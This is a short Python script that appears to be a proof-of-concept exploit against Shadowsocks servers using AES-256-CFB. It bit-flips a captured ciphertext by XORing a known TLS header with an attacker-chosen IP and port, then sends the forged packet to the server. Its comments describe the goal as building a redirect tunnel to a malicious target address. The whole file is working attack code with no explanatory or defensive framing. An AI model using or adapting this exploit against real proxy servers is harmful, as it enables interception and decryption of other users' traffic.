import encrypt
from encrypt import Encryptor
def xor(s1,s2):
	n=len(s1)
	r=''
	for i in range(n):
		r+=chr(ord(s1[i])^ord(s2[i]))
	return r
method='aes-256-cfb'
def up(c):
    l=16-len(c)%16
    c=c+'\x00'*l
    return c
#c is a capture http packet.
c='57122435b0ab1e28db5e59f49f5510dc7196c0cba5e6119eb8cf293210522da840b1360e7b0727122e90bb9c474f586574742fdbc5bc6ca39d8f79afefc21db6a3dbf263d6116260dd7f763691b105091ce07e8f98e9215639099c0912defd608c8c0da1e9ce4f6127a933e60833a953c1ace7f7c6589ad0f7cf1347e2967699cfb70a9a9b6114f13454f49472793504f1487b0ff73604fe0fd82ae92b8ca082fc8ca978303da066edda40e6'
c=c.decode('hex')
#c=up(c)
prefix_http='HTTP/1.'
prefix_https_recv='\x16\x03\x03\x00\x8d\x02\x00'
prefix_https_send='\x16\x03\x01\x02\x00\x01\x00'
#targetIP='\x01\xc0\xa8\x01\x03\x12\x12'# malicous target IP address: 192.168.1.3:4626
#targetIP='\x01\x23\xbd\xa0\x6b\x1f\x90'
targetIP='\x01\x2f\x34\xab\x43\x12\x12'
x=xor(prefix_https_recv,targetIP)
y=c[16:16+7]
z=xor(x,y)
cipertext=c[0:16]+z+c[16+7:]
import socket
obj = socket.socket()
print ("begin\n")
obj.connect(("ip",8080))# ss-server is running on 192.168.1.2:8899
obj.send(cipertext)# send the payload to construct a redirect tunnel
buf=obj.recv(1024)


